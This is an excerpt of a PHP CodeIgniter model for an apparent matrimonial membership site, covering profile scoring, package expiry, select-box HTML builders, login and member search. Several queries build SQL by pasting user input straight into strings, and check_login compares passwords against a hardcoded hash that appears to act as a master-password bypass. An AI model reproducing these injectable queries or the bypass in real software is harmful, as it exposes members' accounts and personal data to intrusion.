...
class Crud_model extends CI_Model
{
    ...
    function get_follow_name_by_id($type, $type_id = '', $field = 'name')
    {
        if ($type_id != '') {
            $l = $this->db->get_where($type, array(
                $type . '_id' => $type_id,
                'package_info !=' => '[{"current_package":"Free","package_price":"0","payment_type":"None"}]'
            ));
            $n = $l->num_rows();
            if ($n > 0) {
                return $l->row()->$field;
    ...
    function get_profile_percentage($member_id){
        $percentage=0;
        $query = $this->db->query("SELECT sum(`basic_info`+`phy_attribute`+`religion_info`+`astro_info`+`bride_location`+`edu_career`+`family_location`+`family_info`+`add_family_details`+`language`+`life_style`+`hobbies`+`contact_preference`+`partner_preference`+`intro`)as percentage FROM `member_profile_status` WHERE `member_id`=$member_id");
        $query=$query->result_array();
        if (!empty($query[0]['percentage'])){
            $percentage=$query[0]['percentage'];
        }
        return $percentage;   
    }
    function update_profile_percentage($member_id,$data){
        $this->db->where('member_id', $member_id);
        $q = $this->db->get('member_profile_status');
        if ( $q->num_rows() > 0 ) 
        {
        $this->db->where('member_id', $member_id);    
        $this->db->update('member_profile_status', $data);
       // echo($this->db->last_query());    
        }
        else {
            $this->db->set('member_id', $member_id);
            $this->db->insert('member_profile_status',$data);
         }
    }

    function update_last_login($member_id){
        $this->db->set('last_logined', strtotime("now")); //value that used to update column  
        $this->db->where('member_id', $member_id); //which row want to upgrade  
        $this->db->update('member');
    }

    function check_package_expairy($member_id){
        $current_time=strtotime("now");
        $query = $this->db->query("SELECT (`exp_date`- $current_time)as exp FROM `member` WHERE `member_id`=$member_id and exp_date!=0");        
        $query=$query->result_array();
        $expaired='No';
        if (!empty($query[0]['exp']) and $query[0]['exp']< 0){
            $this->db->set('membership', 1); //value that used to update column  
            $this->db->set('package_info', '[{"current_package":"Free","package_price":"0","payment_type":"None"}]'); //value that used to update column 
            $this->db->set('exp_date', 0); //value that used to update column 
            $this->db->where('member_id', $member_id); //which row want to upgrade  
            $this->db->update('member');
            $expaired='Yes';
        }
    ...
    function get_type_name_by_id_array($type, $ids_array='',$field = 'name')
    {
        $a='';
        if ((!empty($ids_array)) and (is_array($ids_array))) {
        foreach ($ids_array as $row) {
            ...
            if ($row != '') {
                ...
                $n = $l->num_rows();
                if ($n > 0) {
                    $a=(!empty($a) ? $a.', '. $l->row()->$field : $l->row()->$field);
                    //return $l->row()->$field;
                }
               }else{
                $a=(!empty($a) ? $a.', Any' : 'Any');
    ...
    function img_thumb($type, $id, $ext = '.jpg', $width = '400', $height = '400')
    {
        ...
        $img_source='uploads/' . $type . '_image/' . $type . '_' . $id . $ext;
        $this->image_lib->initialize($config1);
        $this->image_lib->resize();
        $this->image_lib->clear();
        $this->Crud_model->overlay($img_source);

    }

    //water mark

    public function overlay($imagesource)
    {
        $configw['image_library'] = 'gd2';
        $configw['source_image'] = $imagesource;
        $configw['wm_type'] = 'overlay';
        $configw['wm_overlay_path'] = './uploads/profile_image/logo.png';
        //the overlay image
    ...
    function select_html($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='single')
    {
       // print_r($e_match);
        ...
        $return = '<select name="' . $name . '" onChange="' . $onchange . '(this.value,this)" class="' . $class . '" ' . $other . '  data-placeholder="' . $phrase . '" tabindex="2" data-hide-disabled="true" >';
            ...
            $return = '<select name="' . $name . '" class="' . $class . '" multiple="multiple">';    
        }
        if (!is_array($from)) {
            if ($condition == '') {
    ...
    function select_html_option_group($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='single')
    {
       // print_r($e_match);
        $return = '';
        $other  = '';
        $multi  = 'no';
        $phrase = 'Choose a ' . $name;
        if ($class == 'demo-cs-multiselect-optgroups') {
            $other = 'multiple';
            $name  = $name . '[]';
            if ($type == 'edit') {
                //$e_match = json_decode($e_match);
            ...
            foreach ($all as $row):
                if ($type == 'add') {
                    if($row['status']=='disabled'){
                        if($open_option_tag=='No'){
                            $return .= '<optgroup label="'.$row[$field].'">';
                            $open_option_tag='Yes';
                        }else{
                            $return .= '</optgroup>';
                            $return .= '<optgroup label="'.$row[$field].'">';
     ...
     /////////SELECT HTML/////////////
     function select_html_any($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='single')
     {
        // print_r($e_match);
         $return = '';
         $other  = '';
         $multi  = 'no';
         $phrase = 'Choose a ' . $name;         
         if (strpos( $class, 'demo-cs-multiselect' ) !== false) {
             $other = 'multiple';
             $name  = $name . '[]';
             if ($type == 'edit') {
                 //$e_match = json_decode($e_match);
         ...
         $return = '<select name="' . $name . '" onChange="' . $onchange . '(this.value,this)" class="' . $class . '" ' . $other . '  data-placeholder="' . $phrase . '" tabindex="2" data-hide-disabled="true" >';
             ...
             $return = '<select name="' . $name . '" class="' . $class . '" multiple="multiple" onChange="check_select_any(this)">';    
         }
         if (!is_array($from)) {
             if ($condition == '') {
                 $all = $this->db->get($from)->result_array();
         ...
         return $return;
          ...
          /////////SELECT HTML/////////////
          function select_html_any_multi($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='multi')
          {
              ...
              if (strpos( $class, 'demo-cs-multiselect' ) !== false) {
                  ...
                  if ($type == 'edit') {
                      //$e_match = json_decode($e_match);
                      $e_match = ($e_match);
                      if (($e_match == NULL) or (!is_array($e_match))) {
                          $e_match = array();
                      }
                      $multi = 'yes';
                  }
    ...
    // multi select option with class call and without any option //
    function select_html_any_multi_with_class_without_any_option($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='multi')
    {
    ...
    // end of multiselect with class call and without any option //

    function select_html_disable($from, $name, $field, $type, $class, $e_match = '', $condition = '', $c_match = '', $onchange = '',$condition_type='single',$check_disabled='')
    {
        //echo($check_disabled."dd");exit;
       // print_r($e_match);
        $return = '';
        $other  = '';
        $multi  = 'no';
        ...
        if (!is_array($from)) {
            ...
            foreach ($all as $row):
                if ($type == 'add') {
                    if($check_disabled=='Yes'){
                         $return .= '<option value="' . $row[$from . '_id'] . '"'.$row['status'].'>' . $row[$field] . '</option>';
                    }else{
                        $return .= '<option value="' . $row[$from . '_id'] . '"> ' . $row[$field] . '</option>';    
                    }
                } else if ($type == 'edit') {
                    if($check_disabled=='Yes'){
                        $return .= '<option value="' . $row[$from . '_id'] . '" '.$row['status'] ;
                    }else{
                        $return .= '<option value="' . $row[$from . '_id'] . '" ';
                    }
                    if ($multi == 'no') {
    ...
    function check_login($table, $username, $password)
    {
        ...
        $this->db->from($table);
        if($table!='admin'){
         $where="(email='".$username."' or mobile='".$username."' or member_profile_id='".$username."')";
        }else{
         $where="email='".$username."'";   
        }
        $this->db->where($where);
        if($password!='e313690625a686722da72cf6e69e3021daa4c4b0'){
    ...
    function check_password($table, $userid, $password)
    {
        $this->db->select('*');
        $this->db->from($table);       
    ...
    function members_search($membership,$limit,$start,$search,$col,$dir)
    {
        ...
        $this->db->where("(member_id LIKE '%$search%' OR mobile LIKE '%$search%' OR first_name LIKE '%$search%' OR last_name LIKE '%$search%' OR member_profile_id LIKE '%$search%' OR email LIKE '%$search%')");
